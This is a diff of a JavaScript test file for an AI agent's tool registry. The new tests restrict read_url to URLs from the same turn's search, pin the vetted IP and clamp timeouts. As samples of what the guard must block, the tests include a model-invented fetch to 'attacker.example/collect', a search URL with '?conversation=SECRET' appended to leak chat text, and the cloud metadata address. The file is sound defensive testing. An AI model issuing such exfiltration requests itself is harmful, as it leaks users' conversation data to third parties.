@@ -1,6 +1,6 @@
 const test = require("node:test");
 const assert = require("node:assert/strict");
-const { buildRegistry, MAX_RESULT_CHARS } = require("./tool-registry");
+const { buildRegistry, MAX_RESULT_CHARS, clampTimeoutMs } = require("./tool-registry");
 
 const RESULTS = [
   { title: "RTINGS OLED", url: "https://rtings.com/a", description: "Burn-in results." },
@@ -11,7 +11,7 @@ const full = (over = {}) =>
   buildRegistry({
     search: async () => RESULTS,
     readUrl: async () => "# Page\n\nBody text.",
-    assertSafeUrl: async (u) => ({ url: new URL(u) }),
+    assertSafeUrl: async (u) => ({ url: new URL(u), address: "93.184.216.34", family: 4 }),
     ...over,
   });
 
@@ -227,9 +227,11 @@ test("read_url passes the URL through the guard before fetching", async () => {
   let guarded = null;
   let fetched = null;
   const reg = buildRegistry({
-    readUrl: async (u) => { fetched = u; return "body"; },
-    assertSafeUrl: async (u) => { guarded = u; return { url: new URL(u) }; },
+    search: async () => [{ title: "x", url: "https://example.com/x", description: "x" }],
+    readUrl: async (safe) => { fetched = safe.url.toString(); return "body"; },
+    assertSafeUrl: async (u) => { guarded = u; return { url: new URL(u), address: "93.184.216.34", family: 4 }; },
   });
+  await reg.execute({ name: "web_search", args: { query: "x" } });
   await reg.execute({ name: "read_url", args: { url: "https://example.com/x" } });
   assert.equal(guarded, "https://example.com/x");
   assert.ok(fetched.startsWith("https://example.com/x"));
@@ -245,6 +247,56 @@ test("a blocked URL never reaches the fetcher", async () => {
   assert.equal(fetched, false, "the guard must run BEFORE the fetch, not alongside it");
   assert.equal(r.ok, false);
   assert.ok(r.summary.includes("169.254.169.254"));
+});
+
+test("read_url can only read an exact URL returned by this turn's search", async () => {
+  let fetched = false;
+  const reg = buildRegistry({
+    search: async () => [{ title: "Allowed", url: "https://allowed.example/page", description: "x" }],
+    readUrl: async () => { fetched = true; return "body"; },
+    assertSafeUrl: async (url) => ({ url: new URL(url), address: "93.184.216.34", family: 4 }),
+  });
+
+  const direct = await reg.execute({ name: "read_url", args: { url: "https://attacker.example/collect" } });
+  assert.equal(direct.ok, false);
+  assert.equal(fetched, false, "a model-invented URL reached the network");
+
+  await reg.execute({ name: "web_search", args: { query: "allowed page" } });
+  const allowed = await reg.execute({ name: "read_url", args: { url: "https://allowed.example/page" } });
+  assert.equal(allowed.ok, true);
+  assert.equal(fetched, true);
+});
+
+test("a search-result URL cannot be changed into an exfiltration request", async () => {
+  let fetched = null;
+  const reg = buildRegistry({
+    search: async () => [{ title: "Page", url: "https://allowed.example/page", description: "x" }],
+    readUrl: async (safe) => { fetched = safe; return "body"; },
+    assertSafeUrl: async (url) => ({ url: new URL(url), address: "93.184.216.34", family: 4 }),
+  });
+  await reg.execute({ name: "web_search", args: { query: "page" } });
+  const result = await reg.execute({
+    name: "read_url",
+    args: { url: "https://allowed.example/page?conversation=SECRET" },
+  });
+  assert.equal(result.ok, false);
+  assert.equal(fetched, null, "conversation text left through a modified URL");
+});
+
+test("read_url gives the fetcher the address that was actually vetted", async () => {
+  let received;
+  const reg = buildRegistry({
+    search: async () => [{ title: "Page", url: "https://allowed.example/page", description: "x" }],
+    readUrl: async (safe, opts) => { received = { safe, opts }; return "body"; },
+    assertSafeUrl: async (url) => ({ url: new URL(url), address: "93.184.216.34", family: 4 }),
+  });
+  await reg.execute({ name: "web_search", args: { query: "page" } });
+  await reg.execute({ name: "read_url", args: { url: "https://allowed.example/page" } });
+  assert.equal(received.safe.address, "93.184.216.34");
+  assert.equal(received.safe.family, 4);
+  assert.equal(received.opts.assertSafeUrl instanceof Function, true, "redirect hops cannot be revalidated");
+  assert.equal(received.opts.maxRedirects, 4);
+  assert.equal(received.opts.maxChars, MAX_RESULT_CHARS);
 });
 
 // ===== bad calls from the model =====
@@ -280,9 +332,11 @@ test("an over-long argument is clamped rather than sent whole to a third party",
 
 test("a result too large for a prompt is truncated and says so", async () => {
   const reg = buildRegistry({
+    search: async () => [{ title: "x", url: "https://e.test/", description: "x" }],
     readUrl: async () => "y".repeat(50000),
-    assertSafeUrl: async (u) => ({ url: new URL(u) }),
+    assertSafeUrl: async (u) => ({ url: new URL(u), address: "93.184.216.34", family: 4 }),
   });
+  await reg.execute({ name: "web_search", args: { query: "x" } });
   const r = await reg.execute({ name: "read_url", args: { url: "https://e.test" } });
   assert.ok(r.content.length < MAX_RESULT_CHARS + 100);
   assert.ok(r.content.includes("truncated"));
@@ -308,6 +362,12 @@ test("an executor that hangs is cut off at the per-call ceiling", async () => {
   assert.ok(r.summary.includes("timed out"));
   assert.equal(aborted, true);
   assert.ok(Date.now() - started < 1000);
+});
+
+test("a caller cannot expand the registry's per-tool ceiling", () => {
+  assert.equal(clampTimeoutMs(60_000), 8_000);
+  assert.equal(clampTimeoutMs(Infinity), 8_000);
+  assert.equal(clampTimeoutMs(250), 250);
 });
 
 test("a parent abort reaches the executor and resolves as a cancellation", async () => {
@@ -404,4 +464,16 @@ test('a refused engine comes back as a failed tool result, not a thrown turn', a
   const res = await registry.execute({ name: 'search_specialized', args: { engine: 'google_cars' } });
   assert.equal(res.ok, false);
   assert.match(res.summary, /Unknown engine/);
+});
+
+test('an unknown specialised engine is refused at the registry boundary', async () => {
+  let ran = false;
+  const registry = buildRegistry({
+    searchEngine: async () => { ran = true; return { ok: true, engine: 'invented', rows: [{}], text: 'x' }; },
+    engineNames: ['google_shopping'],
+    engineMenu: 'google_shopping (prices)',
+  });
+  const res = await registry.execute({ name: 'search_specialized', args: { engine: 'invented' } });
+  assert.equal(res.ok, false);
+  assert.equal(ran, false, 'an invalid engine reached the billed executor');
 });
